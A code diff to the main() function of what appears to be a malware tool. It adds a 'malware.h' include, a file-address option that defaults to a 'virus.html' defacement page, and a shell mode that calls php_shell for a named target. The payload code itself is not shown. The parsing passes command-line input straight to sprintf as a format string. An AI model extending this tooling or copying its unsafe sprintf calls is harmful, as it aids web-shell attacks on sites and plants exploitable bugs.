@@ -1,4 +1,5 @@
 #include "func.h"
+#include "malware.h"
 
 int main(int argc, char** argv)
 {
@@ -10,15 +11,22 @@ int main(int argc, char** argv)
 	Tname[0] = '\0';
 	OS[0] = '\0';
 	mode[0] ='\0';
+	Faddr[0] = '\0';
 
 	// initiali zation
 	for(int i = 1; i < argc; i++)
 	{
 		if(strstr(argv[i], "-mode") || strstr(argv[i], "mode") || strstr(argv[i], "--mode") || strstr(argv[i], "-m")) sprintf(mode, argv[i+1]);
+
 		if(strstr(argv[i], "-os") || strstr(argv[i], "os") || strstr(argv[i], "--os") || strstr(argv[i], "-o"))	sprintf(OS, argv[i+1]);
+
 		if(strstr(argv[i], "-port") || strstr(argv[i], "port") || strstr(argv[i], "--port") || strstr(argv[i], "-p")) port = atoi(argv[i+1]);
+
 		if(strstr(argv[i], "-name") || strstr(argv[i], "name") || strstr(argv[i], "--name") || strstr(argv[i], "-n")) sprintf(Tname, argv[i+1]);
 		if(strstr(argv[i], "-ip") || strstr(argv[i], "ip") || strstr(argv[i], "--ip") || strstr(argv[i], "-i")) sprintf(Tip, argv[i+1]);
+
+		if(strstr(argv[i], "-fileaddress") || strstr(argv[i], "fileaddress") || strstr(argv[i], "--fileaddress") || strstr(argv[i], "-fd") || strstr(argv[i], "-FD")) sprintf(Faddr, argv[i+1]);
+
                 if(strstr(argv[i], "-help") || strstr(argv[i], "help") || strstr(argv[i], "--hel[") || strstr(argv[i], "-h"))
                 {
                                 printf(
@@ -51,6 +59,7 @@ int main(int argc, char** argv)
 	if(Tname[0] == '\0') sprintf(Tname, "Target");
 	if(Tip[0] == '\0') sprintf(Tip, "127.0.0.1");
 	if(OS[0] == '\0') sprintf(OS, "Linux");
+	if(Faddr[0] == '\0') sprintf(Faddr, "DefaultDiface/virus.html");
 
 	if(strstr(mode, "targetcreate")  ||
 	   strstr(mode, "target-create") ||
@@ -97,6 +106,18 @@ int main(int argc, char** argv)
                 }
 
 	}
+
+	else
+        if(strstr(mode, "shell")  ||
+           strstr(mode, "Shell") ||
+           strstr(mode, "SHELL")  ||
+           strstr(mode, "sh")             ||
+           strstr(mode, "SH")
+           )
+	{
+		php_shell(Tname, Faddr);
+	}
+
 
 	return 0;
 }
